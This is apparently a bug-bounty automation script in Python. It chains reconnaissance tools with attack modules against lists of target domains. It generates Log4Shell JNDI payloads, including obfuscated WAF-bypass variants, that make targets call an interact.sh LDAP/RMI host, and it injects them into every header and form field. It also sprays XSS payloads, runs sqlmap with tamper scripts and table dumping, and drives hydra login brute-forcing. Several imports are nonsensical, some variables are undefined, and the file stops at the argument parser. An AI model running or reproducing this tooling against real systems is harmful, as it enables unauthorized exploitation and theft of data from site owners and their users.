#!/bin/python3

from ast import Break, Continue
from asyncio import protocols, sleep
from audioop import add
import os
from platform import platform
import py_compile
import random
from sre_constants import RANGE_UNI_IGNORE
from telnetlib import theNULL
from typing_extensions import Protocol
from xml import dom
from dns.rdatatype import NULL
from importlib_metadata import re
from more_itertools import callback_iter, strip
import requests
# import urllib.request
import time
from typing import final
import dns, dns.resolver
from requests.api import head
from termcolor import cprint
import argparse, getopt, sys
from payloads import *
from bs4 import BeautifulSoup
from requests_html import HTMLSession
from pprint import pprint
from urllib.parse import urljoin
import webbrowser
# from icecream import ic #cool print debugging, did a pip3 install but shows an error, still works though ;0 (https://towardsdatascience.com/do-not-use-print-for-debugging-in-python-anymore-6767b6f1866d)


#### VARS

##Logging##
logTarget = "targetlogfilename"
#platform = "bugcrowd"
# platform = "hacker1"
# Make sure you / at the end $path/logs/ NOT $path/logs
logDir = f"~/{platform}/{logTarget}/logs/"
logDir = f"~/{logTarget}/logs/"

##Wordlists##
#wordlist="/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt"
wordlist = "/usr/share/wordlists/dirb/common.txt"
randomIntSmall = random.randint(2,11)    #random int between 1 & 10
randomIntBig = random.randint(2,1001)

##interact.sh listeners##
attackerLDAP = 'yourinteracturl.interact.sh:1389'
callback_host = 'yourinteracturl.interact.sh'

####


def generate_payload(protocol, callback_attacker, payload_string):
    new_payload = '${jndi:{{protocol}}://{{callback_attacker}}/{{payload}}}'
    new_payload = new_payload.replace("{{protocol}}", protocol)
    new_payload = new_payload.replace("{{callback_attacker}}", callback_attacker)
    new_payload = new_payload.replace("{{payload}}", payload_string)
    return new_payload


def generate_header_payloads(protocol, callback_attacker, payload_string):
    payloads = {}
    for x in Headers:
        payloads[x] = generate_payload(protocol, callback_attacker, payload_string)
    return payloads


def generate_waf_bypass_payloads(callback_host, payload_string):
    payload = []
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", payload_string)
        payload.append(new_payload)
    return payload


def generate_headers(header):
    payload = {}
    for i in Headers:
        payload[i] = header
    return payload


#If want make the form submitter a class, not needed thogh
def get_all_forms(url):
    session = HTMLSession()
    """Returns all form tags found on a web page's `url` """
    # GET request
    res = session.get(url, verify=False)
    # for javascript driven website
    # res.html.render()
    soup = BeautifulSoup(res.html.html, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """Returns the HTML details of a form,
    including action, method and list of form controls (inputs, etc)"""
    details = {}
    # get the form action (requested URL)
    # action = form.attrs.get("action").lower()
    action = form.attrs.get("action")
    # get the form method (POST, GET, DELETE, etc)
    # if not specified, GET is the default in HTML
    method = form.attrs.get("method", "get").lower()
    # get all form inputs
    inputs = []
    for input_tag in form.find_all("input"):
        # get type of input form control
        input_type = input_tag.attrs.get("type", "text")
        # get name attribute
        input_name = input_tag.attrs.get("name")
        # get the default value of that input tag
        input_value =input_tag.attrs.get("value", "")
        # add everything to that list
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def formSubmit(url, payload=xsspayloads[0]):
    session = HTMLSession()
    # get the first form
    # the data body we want to submit
    data = {}
    try:
        first_form = get_all_forms(url)[0]  #MAKE SURE THIS GETS ALL FORMS. THINK NEED A FOR LOOP & RIGHT NOW ONLY GETS 1 FORM
        # extract all form details
        form_details = get_form_details(first_form)
        pprint(form_details)
        for input_tag in form_details["inputs"]:
            if input_tag["type"] == "hidden":
                # if it's hidden, use the default value
                data[input_tag["name"]] = input_tag["value"]
            elif input_tag["type"] != "submit":
                # all others except submit, prompt the user to set it
                # value = input(f"Enter the value of the field '{input_tag['name']}' (type: {input_tag['type']}): ")    #to prompt for payload
                # data[input_tag["name"]] = value
                data[input_tag["name"]] = payload
                
            # join the url with the action (form request URL)
        url = urljoin(url, form_details["action"])
            
        if form_details["method"] == "post":
            res = session.post(url, data=data, verify=False)
        elif form_details["method"] == "get":
            res = session.get(url, params=data, verify=False)    
        # This is also just for writing results to a page. Sign in or submit doesn't work
        # the below code is only for replacing relative URLs to absolute ones
        # soup = BeautifulSoup(res.content, "html.parser")
        # for link in soup.find_all("link"):
        #     try:
        #         link.attrs["href"] = urljoin(url, link.attrs["href"])
        #     except:
        #         pass
        # for script in soup.find_all("script"):
        #     try:
        #         script.attrs["src"] = urljoin(url, script.attrs["src"])
        #     except:
        #         pass
        # for img in soup.find_all("img"):
        #     try:
        #         img.attrs["src"] = urljoin(url, img.attrs["src"])
        #     except:
        #         pass
        # for a in soup.find_all("a"):
        #     try:
        #         a.attrs["href"] = urljoin(url, a.attrs["href"])
        #     except:
        #         pass
        
        ##The below isn't needed, this just shows the results of what you did
        # write the page content to a file
        # open(f"{logDir}{randomIntBig}page.html", "w").write(str(soup))
    
        # open the page on the default browser
        # webbrowser.open(f"{logDir}page.html")

    except Exception as e:
        cprint(e, "red")


def goBuster(URL=None):
    #command = f"gobuster dir -u 'https://{{target}}' -w '{wordlist}' -o '{logDir}{{target}}-gobusted{randomIntSmall}' --wildcard -r"
    # command = f"gobuster dir -u '{{target}}' -w '{wordlist}' --wildcard -r"     #this is used more of a specific URL, https://target/admin/
    command = f"gobuster dir -u '{{target}}' -w '{wordlist}' --wildcard -r -o '{logDir}{{target}}-gobusted{randomIntSmall}"

    cprint(f"Using wordlist: {wordlist}\n", "yellow")
    time.sleep(3)

    if URL == None:
        for i in open(logDir + "targetDomains", 'r').read().splitlines():
        
            cprint(f"[Batch] Running gobuster on: {i}\n", "green")
            cprint(f"[Batch] Log file: {logDir}{i}-gobusted \n", "yellow")
            
            os.system(command.replace("{target}", i))

    else:
        cprint(f"[Single] Running gobuster on: {URL}\n", "green")
        cprint(f"[Single] Log file: {logDir}{URL}-gobusted \n", "yellow")

        os.system(command.replace("{target}", URL))
        

def wayBackURLs(domain=None):
    command = f"waybackurls '{{target}}' >> '{logDir}{{target}}-waybackurls'"

    if domain == None:
        for target in open(logDir + "targetDomains", 'r').read().splitlines():
            cprint(f"[Batch] Running waybackurls on {target}", "green")

            os.system(command.replace("{target}", target))
    
    else:
        cprint(f"[Single] Running waybackurls on {domain}", "green")
        os.system(command.replace("{target}", domain))


def addHttps(file=None):
    if file == None:
        for i in open(f'{logDir}targetDomains', 'r').read().splitlines():
            for line in open(f'{logDir}{i}-Sublist3r', 'r').read().splitlines():
                open(f'{logDir}{i}-Sublist3rHttp','a').write(f"http://{line}\n")

    else:
        for domain in open(file, "r").read().splitlines():
            open(f'{logDir}{file}-addedHttp', "a+").write(f"http://{domain}\n")


def sublist3r(URL=None):
    command = (f"python3 /github/Sublist3r/sublist3r.py -d {{target}} -t 15 -o {logDir}{{target}}-Sublist3r")

    if URL == None:
        for i in open(logDir + "targetDomains", 'r').read().splitlines():
            
            cprint(f"Running Sublist3r on: {i}", "green")
            os.system(command.replace("{target}", i))
    
    else:
        cprint(f"Running Sublist3r on: {URL}", "green")
        os.system(command.replace("{target}", URL))

    addHttps()


###Fix the duplicate with the replace like gobuster or waybackurls 
def log4j(URL=None):
    cprint("Running log4j Intense mode with all headers \n", "green")
    
    outLogFile = open(f"{logDir}log4j", "a")    #Creates the log4jtargs file

    payload_string = "vulnerable"
        
    if URL == None:
        for i in open(logDir + "log4jtargs", "r").read().splitlines():
            cprint(f"URL is: {i}", "green")

            try:
    
                for wafPayload in generate_waf_bypass_payloads(callback_host, payload_string):
                    requests.get(i, headers=generate_headers(wafPayload), verify=False, timeout=10)
                    formSubmit(i, wafPayload)
                for wafPayload in generate_waf_bypass_payloads(attackerLDAP, payload_string):
                    requests.get(i, headers=generate_headers(wafPayload), verify=False, timeout=10)
                    formSubmit(i, wafPayload)

                requests.get(i, headers=generate_headers(f"ldap://{attackerLDAP}/{payload_string}"), verify=False, timeout=10)
                cprint(f"LDAP port 1389 attack sent to: {i}", "magenta")
                 
            except Exception as e:
                cprint(e, "red")    
                 
            else:
                outLogFile.write(f"WAF Payloads sent to {i}\n")
                cprint(f"WAF Payloads sent to {i}\n"), "magenta"
    
            for x in proto:
                try:
                    requests.get(i, headers=generate_header_payloads(x, callback_host, payload_string), verify=False, timeout=10)
                    formSubmit(URL, generate_payload(x, callback_host, payload_string))
                    
                except Exception as e:
                    cprint(e, "red")
                    
                else:
                    outLogFile.write(f"Normal Payloads sent to {i}\n")
                    cprint(f"Normal Payloads sent to {i}\n", "magenta")
    
    else:
        cprint(f"URL is: {URL}", "green")

        try:
            for wafPayload in generate_waf_bypass_payloads(callback_host, payload_string):
                requests.get(URL, headers=generate_headers(wafPayload), verify=False, timeout=10)
                formSubmit(URL, wafPayload)
            
            for wafPayload in generate_waf_bypass_payloads(attackerLDAP, payload_string):
                requests.get(URL, headers=generate_headers(wafPayload), verify=False, timeout=10)
                formSubmit(URL, wafPayload)


            requests.get(URL, headers=generate_headers(f"ldap://{attackerLDAP}/{payload_string}"), verify=False, timeout=10)
            cprint(f"LDAP 1389 attack sent to: {URL}", "magenta")

        except Exception as e:
            cprint(e, "red")

        else:
            cprint(f"WAF Payloads sent to: {URL}", "magenta")
        
        for x in proto:
            try:
                requests.get(URL, headers=generate_header_payloads(x, callback_host, payload_string), verify=False, timeout=10)
                formSubmit(URL, generate_payload(x, callback_host, payload_string))

            except Exception as e:
                cprint(e, "red")
            
            else:
                cprint(f"Normal Payloads sent to: {URL}", "magenta")



        
###Fix the duplicate with the replace like gobuster or waybackurls
def sqlmap(url=None):
    cprint("Log file location: /$user/.local/share/sqlmap/output/", "green")
    cprint("\nThe data will be in the log file above if injectable; or xsshunter/log4j listener, etc\n", "yellow")


    # if add --threads 10 will go faster after find a valid DB to mess with
    # command = "sqlmap -u " + '"' + url + '"' + " --dbs --batch --tamper=space2comment --tamper=apostrophemask --random-agent --level 3 --risk 3"
    # command = "sqlmap -u " + '"' + url + '"' + " --dbs --batch --forms --crawl=2"
    # command = "sqlmap -u " + '"' + url + '"' + " --dbs --batch --forms --tamper=apostrophemask --random-agent --level 3 --risk 3"
    # command = "sqlmap -u " + '"' + url + '"' + " --dbs --batch --forms --tamper=apostrophemask --random-agent --crawl=5"
    # SQLMap = f'sqlmap -u  "{url}" --banner --batch --tamper=apostrophemask --random-agent --level 3 --risk 3'
    # SQLMapForms = f'sqlmap -u  "{url}" --banner --forms --batch --tamper=apostrophemask --random-agent --level 3 --risk 3'
    if url == None:
        cprint("SQLMap will target URL's in file: SQLMapTargets", "red")
        cprint("\nYou can hit ctl + c during a scan and then hit [n]next parameter or [e]end detection", "red")
        cprint("This will allow you to end scan on current target it if appears to not be vulnerable but NOT the script\n", "yellow")
        time.sleep(1)

        # SQLMap = f"sqlmap --banner --batch --tamper=apostrophemask --random-agent -o -m {logDir}SQLMapTargets --risk 3 --level 3 --smart"
        # SQLMapForms = f"sqlmap --banner --forms --batch --tamper=apostrophemask --random-agent -o -m {logDir}SQLMapTargets --risk 3 --level 3 --smart"
        SQLMapForms = f"sqlmap --current-user --forms --batch --tamper=apostrophemask,space2comment,space2hash --random-agent -o -m {logDir}SQLMapTargets --risk 2 --level 2"
        SQLMap = f"sqlmap --current-user --batch --tamper=apostrophemask,space2comment,space2hash --random-agent -o -m {logDir}SQLMapTargets --risk 3 --level 5"
        # SQLMap = f"sqlmap --hex --tamper=base64encode --random-agent --risk 3 --level 5 --threads 10 --batch -b -m {logDir}SQLMapTargets"
        # sqlMapTamperMySQL = f"sqlmap --current-user --tamper=between,bluecoat,charencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor -m {logDir}SQLMapTargets"
        # sqlmapCrawl = f'sqlmap --current-user --forms --batch --crawl=5 --tamper=apostrophemask,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion --random-agent -o --risk 2 --level 2 -m {logDir}SQLMapTargets'
        time.sleep(1)
        # cprint("Running command: " + SQLMapInject, "magenta")
        # os.system(SQLMapInject)
        cprint("Running command: " + SQLMap, "magenta")
        os.system(SQLMap)
        cprint("Running command: " + SQLMapForms, "magenta")
        os.system(SQLMapForms)
        # cprint("Running MySQL tamper command: " + sqlMapTamperMySQL, "magenta")
        # os.system(sqlMapTamperMySQL)
        # cprint("Running MySQL crawl command: " + sqlmapCrawl, "magenta")
        # os.system(sqlmapCrawl)

        

    else:
        cprint("You can hit ctl + c during a scan and then hit [n]next parameter or [e]end detection", "red")
        cprint("This will allow you to end scan on current target it if appears to not be vulnerable but NOT the script\n", "yellow")
        cprint(f"\nTarget: {url}", "green")
        sqlmapSingle = f'sqlmap -u "{url}" --banner --tamper=apostrophemask --random-agent -o --risk 3 --level 3'
        sqlmapSingleForms = f'sqlmap -u "{url}" --banner --forms --crawl=5 --tamper=apostrophemask --random-agent -o --risk 2 --level 2'
        # sqlMapTamperMySQL = f"sqlmap -u '{url}' --current-user --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor"
        sqlMapTamperMySQL = f"sqlmap -u '{url}' --hostname --current-user --dbs --random-agent --tamper=random-agent,between,bluecoat,charencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --no-cast"
        sqlMapTamperGeneric = f"sqlmap -u '{url}' --risk 3 --level 5 --dump --random-agent --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes"
        sqlMapTamper = f'sqlmap {url} -v 3 --risk 3 --level 5 --dump --random-agent --tamper="between,randomcase,space2comment"'
        sqlmapCrawl = f'sqlmap {url} --current-user --forms --batch --crawl=5 --tamper=apostrophemask,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion --random-agent -o --risk 2 --level 2'
        
        time.sleep(1)
        
        # cprint("Running command: " + sqlmapSingle, "magenta")
        # os.system(sqlmapSingle)
        # cprint("Running command: " + sqlmapSingleForms, "magenta")
        # os.system(sqlmapSingleForms)
        # cprint("Running command: " + sqlmapSingleInject, "magenta")
        # os.system(sqlmapSingleInject)
        # cprint("Running MySQL tamper command: " + sqlMapTamperMySQL, "magenta")
        # os.system(sqlMapTamperMySQL)
        # cprint("Running generic tamper command: " + sqlMapTamperGeneric, "magenta")
        # os.system(sqlMapTamperGeneric)
        # cprint("Running tamper tor command: " + sqlMapTamper, "magenta")
        # os.system(sqlMapTamper)
        # os.system(f'sqlmap -u {url} --current-user --batch --tamper=apostrophemask,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion --random-agent -o --risk 2 --level 2')
        os.system(f'sqlmap -u {url} --current-user --batch --tamper="apostrophemask,between,randomcase,space2comment" --random-agent -o --risk 3 --level 5')


###Fix the duplicate with the replace like gobuster or waybackurls
# TO DO - add the gobusted file to this with $url/dir and any other files with urls like sn1p3r
# To DO MORE - rate limit the requests and also allow threads for faster and slower
# THINK THIS NEEDS BE DONE AS A POST COMMAND AND NOT GET? The post command will only work where post is accepeted; so maybe not needed beside on POST pages?
def XSS(URL=None):
    cprint(f"Check xss hunter web console for blind injection, log file: {logDir}blindXSS", "green")

    if URL == None:
        for url in open(f"{logDir}targetsWithCodes200", "r").read().splitlines():
            # print(requests.get(i).cookies)    #This could be used to find the cookie on the site and then be more dynamic. The cookieKey probably won't work with just Cookie:
            for payload in xsspayloads:
                command = f"{url}/{payload}"
                command2 = f"{url}{payload}"
                cprint(command, "magenta")
                cprint(url, "magenta")

                try:
                    formSubmit(url, payload)
                
                except Exception as e:
                    cprint("Failed to sumbit data to form", "red")

                try:
                    response = requests.get(command, headers=generate_headers(payload), verify=False, timeout=3)
                
                except Exception as e:
                    cprint(e, "red")
    
                else:
                    open(f"{logDir}blindXSS", "a").write(url + " " + str(response) + "\n")  #just the response
                    # print(response.text)    #print the source code; more of a debugging thing
                
                try:
                    response2 = requests.get(command2, headers=generate_headers(payload), verify=False, timeout=3)
                
                except Exception as e:
                    cprint(e, "red")
    
                else:
                    open(f"{logDir}blindXSS", "a").write(url + " " + str(response2) + "\n")  #just the response
                
    
    else:
        for payload in xsspayloads:
            
            command = (f"{URL}/{payload}")
            command2 = f"{URL}{payload}"

            try:
                cprint(command, "magenta")
                response = requests.get(command, headers=generate_headers(payload), verify=False, timeout=3)
                cprint(response, "green")
                cprint(command2, "magenta")
                response2 = requests.get(command2, headers=generate_headers(payload), verify=False, timeout=3)
                cprint(response2, "green")

                formSubmit(URL, payload)
                                   
            except Exception as e:
                cprint(e, "red")
                
    
def IPlookup(host):
    result = dns.resolver.resolve(host, 'A')

    for ipval in result:
        return ipval.to_text()


def nmap():
    cprint("Running NMAP &(or) masscan on NMAPTargets file \n", "green")
    cprint("Masscan doens't take domains as input, only IP's but an NSLookup will occur on any domain", "red")

    for dom in open(logDir + "NMAPTargets", "r").read().splitlines():
        
        cprint(f"Running nmap on {dom} log file location: {logDir}{dom}-nmap", "green")
        # os.system(f"nmap -sC -A -T 4 -sV -Pn --top-ports 100 {dom} >> {logDir}{dom} -nmap")
        os.system(f"nmap -sC -A -T 4 -sV -Pn -p- {dom} >> {logDir}{dom}-nmap")    
        os.system(f"nmap -sV --script vulners {dom} >> {logDir}/{dom}-vulners")
        #os.system(f"sudo nmap -sU -sT -p- -Pn {dom} >> {logDir}/{dom}-udpallports")    # requires to be run as sudo
        
        # cprint(f"Running masscan on {dom} log file location: {logDir}{dom}-masscan", "green")
        # masscanIP = IPlookup(dom)
        # os.system(f"masscan {masscanIP} -p 1-65535 -oX {logDir}{dom}-masscan")
        


# Used to remove .png, .jpg, .svg, etc
def removeUnwanted(file=None):

    cprint(f'{file}(s) being targeted', 'red')
    cprint("Removing png, jpg, svg, css, js, ico from urls. Check file for small details to remove (such as .svg=dfjska)", "red")
    cprint(f"Log file: {logDir}{file}-dedupedTargets", "green")
    time.sleep(2)

    if file == None:
        
        #creates the dedupedTargets file
        os.system(f'cd {logDir} && grep -hv "^.*jpg$\|^.*svg$\|^.*png$\|^.*css$\|^.*js$\|^.*webp$\|^.*mp3$\|^.*mp4$\|^.*woff$\|^.*woff2$\|^.*tff2$\|^.*gif$\|^.*pdf$\|^.*jpeg$\|^.*JPG$\|^.*JPEG$\|^.*PDF$\|^.*PNG$\|^.*ttf$\|^.*ico$" reconAllTargets | sort -u > dedupedTargets')

    else:
        
        command = f'cd {logDir} && grep -hv "^.*jpg$\|^.*svg$\|^.*png$\|^.*css$\|^.*js$\|^.*webp$\|^.*mp3$\|^.*mp4$\|^.*woff$\|^.*woff2$\|^.*tff2$\|^.*gif$\|^.*pdf$\|^.*jpeg$\|^.*JPG$\|^.*JPEG$\|^.*PDF$\|^.*PNG$\|^.*ttf$\|^.*ico$" {file} | sort -u > dedupedTargets-{file}'
        cprint(f"Command: {command}", "magenta")
        sleep(2)
        os.system(command)


def seperateStatusCodes():

    cprint("Seperating liveURLSStatusCode file for futher scanning", "green")
    cprint(f"Check the {logDir} targetsWithCodes files for data; targetsWithCodes200 is used for XSS, etc.", "green")
    
    statusCode = {'200', '403', '404', '400', '504', '406'}

    for i in statusCode:
        os.system(f"cd {logDir} && grep -A 1 {i} {logDir}dedupedTargets-liveURLStatusCode | grep -o 'http.*://.*' | sort -u > targetsWithCodes{i}")
        
        

def URLStatus(file=None):

    cprint("Finding live URL's in dedupedTargets \n", "green")
    cprint(f"Log Files: {logDir} dedupedTargets-liveURLS(StatusCode) \n", "green")
    
    if file == None:
        
        #Creates the reconAllTargets file so images, css, etc files can be removed
        if os.path.exists(f"{logDir}dedupedTargets"): 
            os.system(f"cd {logDir} && cp dedupedTargets dedupedTargets_bac{randomIntSmall}")

        else:
            os.system("cd {logDir} && cat *waybackurls* *Sublist3r* *amass* *subbrute* | sort -u > reconAllTargets")
            removeUnwanted()    # Creates the dedupedTargets file if not existant

            
        for i in open(f"{logDir}dedupedTargets", "r").read().splitlines():
            try:
                # hostStatus=str(urllib.request.urlopen(i).getcode()) + ": " + i   #old way
                hostStatus = requests.get(i, verify=False, timeout=3)
    
            except Exception as e:
                cprint(e, "red")
                # continue
    
            else:
                if hostStatus.status_code == 404:
                    cprint(f'404 {i}', 'red')
                
                else:
                    cprint(hostStatus.status_code, "magenta")
                    cprint(i + "\n", "magenta")
    
                    open(f"{logDir}dedupedTargets-liveURLStatusCode", 'a').write(str(hostStatus.status_code) + "\n")
                    open(f"{logDir}dedupedTargets-liveURLStatusCode", 'a').write(i + "\n\n")

    else:
        for targ in open(f"{logDir}{file}"):

            try:
                hostStatus = requests.get(targ, verify=False, timeout=3)
    
            except Exception as e:
                cprint(e, "red")
                # continue
        
            else:
                if hostStatus.status_code == 404:
                    cprint(hostStatus.status_code, "red")
                
                else:
                    cprint(hostStatus.status_code, "magenta")
                    cprint(targ + "\n", "magenta")

                    open(f"{logDir}dedupedTargets-liveURLS", 'a').write(targ + "\n")
                    open(f"{logDir}dedupedTargets-liveURLStatusCode", 'a').write(str(hostStatus.status_code) + "\n")
                    open(f"{logDir}dedupedTargets-liveURLStatusCode", 'a').write(targ + "\n\n")
    
    seperateStatusCodes()

def hydra(host):
    ####
    # example full URL for below - http://192.168.0.1/33df0826a8/login
    # hydra -l <USER> -p <PASSWORD> <IP_ADDRESS> http-post-form "<LOGIN_PAGE>:<REQUEST_BODY>:<ERROR_MESSAGE>"
    # payload = "/33df0826a8/login/:username=^USER^&password=^PASS^:Invalid username"
    ####
    os.system(f'hydra {host} http-post-form "{payload}" -l username -P passes.txt')
    

def bypass403():
    cprint("Trying bypass payloads for 403 pages for targets in file: targetscodes403", "green")
    cprint("This should be done manually with Burp Suite 403 bypass extension but for kicks and giggles!", "red")
    time.sleep(2)

    for i in open(f'{logDir}targetsWithCodes403', "r"):
        byp4xx = (f'python3 /github/byp4xx/byp4xx.py -L {i}')
        cprint("Running bypass-403.sh requires the payload in the form of 'http://example.com path' (No error will be thrown)", "red")
        bypass403 = (f'bash /github/bypass-403/bypass-403.sh {i}')
        os.system(byp4xx)
        os.system(bypass403)


def amass(domain=None):
    cprint("""
    amass intel - Discover targets for enumerations
    amass enum  - Perform enumerations and network mapping
    amass viz   - Visualize enumeration results
    amass track - Track differences between enumerations
    amass db    - Manipulate the Amass graph database
    amass dns   - Resolve DNS names at high performance
    """, "green")
    cprint("Example: amass enum -d $domain\n", "yellow")
    
    command = (f"amass enum -d {{domain}} -o {logDir}{{logFile}}-amass.txt")    #-passive -src 2 possible switches from github
    
    if domain == None:
        for dom in open(f"{logDir}targetDomains", "r"):
            
            cmd = command.replace("{domain}", dom)
            os.system(cmd.replace("{logFile}", dom))
            cprint(f"Log file location: {logDir}{domain}-amass", "green")
    
    else:

        cmd = command.replace("{domain}", domain)
        os.system(cmd.replace("{logFile}", domain))
        cprint(f"Log file location: {logDir}{domain}-amass", "green")


def subbrute(domain=None):
    cprint("Check out the README for more info", "green")
    
    command = f"cd /github/subbrute/ && python3 subbrute.py -p {{targetDom}} -o {logDir}{{logFile}}-subbrute"

    if domain == "help":
        os.system("cd /github/subbrute/ && python3 subbrute.py -h")
        
    elif domain == None:
        for dom in open(f"{logDir}targetDomains", "r"):
            cmd = command.replace("{targetDom}", dom)
            os.system(cmd.replace("{logFile}", dom))
            
    else:
        cmd = command.replace("{targetDom}", domain)
        os.system(cmd.replace("{logFile}", domain))

                

###WORK ON THIS ONE. NO WAY TO INVOKE RIGHT NOW
def fuzzUrls():

    payload_string = "vulnerable"
    bracketr_string = "{"
    bracketl_string = "}"
    
    for url in open(f"{logDir}fuzzUrlTargs", "r"):
        try:

            for payload in xsspayloads:
                finalUrl = url.replace("hoopety", payload)
                cprint(finalUrl, "magenta")
                requests.get(finalUrl, verify=False, timeout=1)
            
            for wafPayload in generate_waf_bypass_payloads(callback_host, payload_string):
                finalUrl = url.replace("hoopety", wafPayload)
                cprint(finalUrl, "magenta")
                requests.get(finalUrl, verify=False, timeout=1)
    
            finalUrl = url.replace("hoopety", attackerLDAP)
            cprint(finalUrl, "magenta")
            requests.get(finalUrl, verify=False, timeout=1)
        
        except Exception as e:
            cprint(e, "red")
    
        for x in proto:
            try:
                # requests.get(url, verify=False, timeout=1)
                finalUrl = url.replace("hoopety", f'${bracketr_string}{x}://{callback_host}{bracketl_string}')
                finalUrl1 = url.replace("hoopety", f'{singlequote}{quotes}>${bracketr_string}{x}://{callback_host}{bracketl_string}')
                finalUrl2 = url.replace("hoopety", f'{singlequote}${bracketr_string}{x}://{callback_host}{bracketl_string}{singlequote}')
                finalUrl3 = url.replace("hoopety", f'{quotes}${bracketr_string}{x}://{callback_host}{bracketl_string}{quotes}')
                finalUrl4 = url.replace("hoopety", f'{quotes}\${bracketr_string}{x}://{callback_host}{bracketl_string}{quotes}')
                finalUrl5 = url.replace("hoopety", f'{singlequote}\${bracketr_string}{x}://{callback_host}{bracketl_string}{singlequote}')
                finalUrl6 = url.replace("hoopety", f'\${bracketr_string}{x}://{callback_host}{bracketl_string}')
                
                cprint(f"\nPayloads:", "green")
                cprint(f"{finalUrl}\n", "magenta")
                cprint(f"{finalUrl1}\n", "magenta")
                cprint(f"{finalUrl2}\n", "magenta")
                cprint(f"{finalUrl3}\n", "magenta")
                cprint(f"{finalUrl4}\n", "magenta")
                cprint(f"{finalUrl5}\n", "magenta")
                cprint(f"{finalUrl6}\n", "magenta")
                
                requests.get(finalUrl, verify=False, timeout=1)
                requests.get(finalUrl1, verify=False, timeout=1)
                requests.get(finalUrl2, verify=False, timeout=1)
                requests.get(finalUrl3, verify=False, timeout=1)
                requests.get(finalUrl4, verify=False, timeout=1)
                requests.get(finalUrl5, verify=False, timeout=1)
                requests.get(finalUrl6, verify=False, timeout=1)
                
            except Exception as e:
                cprint(e, "red")
                        
    
def wpscan(URL=None):
    cprint("Ensure your targets are just the BASE domain name, not full URL`s for batch file run", "red")
    time.sleep(3)
    if URL == None:
        # for url in open(f"{logDir}wordpressTargs", "r").read().splitlines():
        for url in open(f"test", "r").read().splitlines():
            stripURL = url.replace("https:", '')
            stripURL = stripURL.replace("/", '')
            os.system(f"wpscan --url {url} -o {logDir}wpscan-{stripURL}")
    else:
        os.system(f"wpscan --url {URL}")


def createFiles():
    for i in {"targetDomains", "SQLMapTargets", "NMAPTargets", "log4jtargs", "fuzzUrlTargs", "wordpressTargs"}:
        os.system(f'touch {logDir}/{i}')    


####BEGINNING####
def test(callback_host, payload):
    # callback_host = "localhost"
    # payload = "vulnerable"
    waf_bypass_payloads = [
            "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{%s}/{%s}}" % (callback_host, payload),
            "${${::-j}ndi:rmi://{%s}/{%s}}" % (callback_host, payload),
            "${jndi:rmi://{%s}}" % (callback_host),
            "${${lower:jndi}:${lower:rmi}://{%s}/{%s}}" % (callback_host, payload),
            "${${lower:${lower:jndi}}:${lower:rmi}://{%s}/{%s}}" % (callback_host, payload),
            "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{%s}/{%s}}" % (callback_host, payload),
            "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{%s}/{%s}}" % (callback_host, payload),
            "${jndi:dns://{%s}}" % callback_host,
    ]
    for i in waf_bypass_payloads:
        print(i)
        
# ic(test("dumb","payload"))

#icecream print for debugging functions
# def square_of(num):
#     return num*num
# ic(square_of(2))    
####END#####        

# add this - https://github.com/0xInfection/XSRFProbe
# os.command = xsrfprobe -u $domain --crawl --no-verify -o csrf- -c "$cookie" -q

# wordpress section - remove from github if they suck
# https://github.com/wpscanteam/wpscan - apt install kali    wpscan --url https://www.auvik.com -e vp (-e vp vuln plugins, -e vt is vuln themes)
# https://github.com/incogbyte/quickpress
# Didn't star the 2 below
# https://github.com/linoskoczek/WPluginScanner
# https://github.com/webarx-security/wpbullet

# https://github.com/defparam/smuggler
# https://github.com/stevenvachon/broken-link-checker
# did not star 1 below
# https://gist.github.com/ndavison/298d11b3a77b97c908d63a345d3c624d

# nuclei would be another good scanner to add - https://github.com/projectdiscovery/nuclei

# cprint("CREATE A MODULE THAT will use wfuzz or somethikng similar to submit the payload into forms, sqlmap won't do this unless injectable; for the most part", "red")
# time.sleep(1)

####MUST DO ON THIS ONE TO REPLACE THE WAYBACKURLS
#https://github.com/projectdiscovery/subfinder

parser = argparse.ArgumentParser(description='Used to automate recon and test for vulnerabilities', 
    formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument("--recon-passive", action='store_false', help='Run WaybackURLs, Subl1st3r, amass, && subbrute. Required file: \033[92m\033[1mtargetDomains\033[0m')
parser.add_argument("--recon-active", action='store_false', help='Runs recon-passive but checks for URL status codes (1 header payload currently configured)')
parser.add_argument("--attack", action='store_false', help='Runs XSS, log4j, & SQLMap functions. Required files: \033[92m\033[1mtargetsWithCodes200\033[0m, \033[92m\033[1mlog4jtargs\033[0m, && \033[92m\033[1mSQLMapTargets\033[0m')
parser.add_argument("--recon-attack", action='store_false', help='Combines recon-active && attack functions')
parser.add_argument("--xss-log4j", action='store_false', help='Combines XSS && Log4j functions. Required files: \033[92m\033[1mtargetsWithCodes200\033[0m && \033[92m\033[1mlog4jtargs\033[0m')
